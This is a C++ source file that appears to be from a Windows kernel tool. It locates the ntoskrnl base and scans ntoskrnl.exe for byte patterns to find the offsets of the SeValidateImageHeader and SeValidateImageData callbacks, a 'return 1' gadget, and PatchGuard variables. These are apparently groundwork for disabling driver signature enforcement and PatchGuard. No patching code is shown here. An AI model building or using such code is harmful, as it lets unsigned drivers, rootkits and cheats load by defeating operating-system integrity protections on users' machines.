#include "Utils.h"
#include "Scan.h"
#include <iostream>

std::optional<ULONG64> KernelUtils::get_ntoskrnl_base()
{
	DWORD CbNeeded = 0;
	LPVOID Drivers[1024] = { 0 };
	if (K32EnumDeviceDrivers(Drivers, sizeof(Drivers), &CbNeeded))
		return (ULONG64)Drivers[0];
	else
	{
		DWORD error = GetLastError();
		std::cerr << "[ERROR] Could not enumerate device drivers. Error code: " << error << std::endl;
		return {};
	}
}


std::optional<ULONG64> KernelUtils::get_se_validate_image_header_offset()
{
	try {
		scanner::handle SeValidateImageHeaderSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("SeValidateImageHeader", "48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE").get_result();
		uint8_t* SignaturePatternBegin = SeValidateImageHeaderSignature.as<uint8_t*>();
		ULONG32 RIPOffsetSeValidateImageHeaderCallback = *(ULONG32*)(&SignaturePatternBegin[3]);
		ULONG32 RIPInstructionLength = 7;
		ULONG64* SeValidateImageHeaderCallbackAddress = SeValidateImageHeaderSignature.add(RIPOffsetSeValidateImageHeaderCallback + RIPInstructionLength).as<ULONG64*>();

		return (ULONG64)SeValidateImageHeaderCallbackAddress - (ULONG64)SeValidateImageHeaderSignature.get_base<uint64_t*>();
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] Failed to get HeaderOffset. Exception : " << e.what() << "\n";
		return {};
	}
}

std::optional<ULONG64> KernelUtils::get_se_validate_image_data_offset()
{
	try {
		scanner::handle SeValidateImageDataSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("SeValidateImageData", "48 8B 05 ? ? ? ? 4C 8B D1 48 85 C0 74 ?").get_result();
		auto SignaturePatternBegin = SeValidateImageDataSignature.as<uint8_t*>();

		ULONG32 RIPOffsetSeValidateImageDataCallback = *(ULONG32*)(&SignaturePatternBegin[3]);
		ULONG32 RIPInstructionLength = 7;
		ULONG64* SeValidateImageDataCallbackAddress = SeValidateImageDataSignature.add(RIPOffsetSeValidateImageDataCallback + RIPInstructionLength).as<ULONG64*>();

		return (ULONG64)SeValidateImageDataCallbackAddress - (ULONG64)SeValidateImageDataSignature.get_base<uint64_t*>();
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] Failed to get DataOffset. Exception : " << e.what() << "\n";
		return {};
	}

}

std::optional<ULONG64> KernelUtils::get_return_offset()
{
	try
	{
		scanner::handle RetSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("ret", "B8 01 00 00 00 C3", ".text").get_result();
		ULONG64* RetAddress = RetSignature.as<ULONG64*>();
		return (ULONG64)RetAddress - (ULONG64)RetSignature.get_base<ULONG64*>();
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] Failed to get ReturnOffset. Exception : " << e.what() << "\n";
		return {};
	}

}

std::optional<ULONG64> KernelUtils::get_patch_gaurd_offset()
{
	try {
		scanner::handle PatchGuardSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("PatchGuard", "38 0D ? ? ? ? 75 02 EB FE").get_result();
		uint8_t* SignaturePatternBegin = PatchGuardSignature.as<uint8_t*>();
		ULONG32 RIPOffsetPatchGuardCallback = *(ULONG32*)(&SignaturePatternBegin[2]);
		ULONG32 RIPInstructionLength = 6;
		ULONG64* PatchGuardCallbackAddress = PatchGuardSignature.add(RIPOffsetPatchGuardCallback + RIPInstructionLength).as<ULONG64*>();

		return (ULONG64)PatchGuardCallbackAddress - (ULONG64)PatchGuardSignature.get_base<uint64_t*>();
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] Failed to get PGOffset. Exception : " << e.what() << "\n";
		return {};
	}
}

std::optional<ULONG64> KernelUtils::get_patch_gaurd_value_offset()
{
	try {
		scanner::handle  PatchGuardValueSignature = scanner::pattern("C:\\windows\\system32\\ntoskrnl.exe").scan_now("patchguardvalue", "00 00 00 00 00 00 00 00", ".rdata").get_result();
		ULONG64* PatchGuardValueAddress = PatchGuardValueSignature.as<uint64_t*>();
		return (ULONG64)PatchGuardValueAddress - (ULONG64)PatchGuardValueSignature.get_base<uint64_t*>();
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] Failed to get PGdValueOffset. Exception : " << e.what() << "\n";
		return {};
	}
}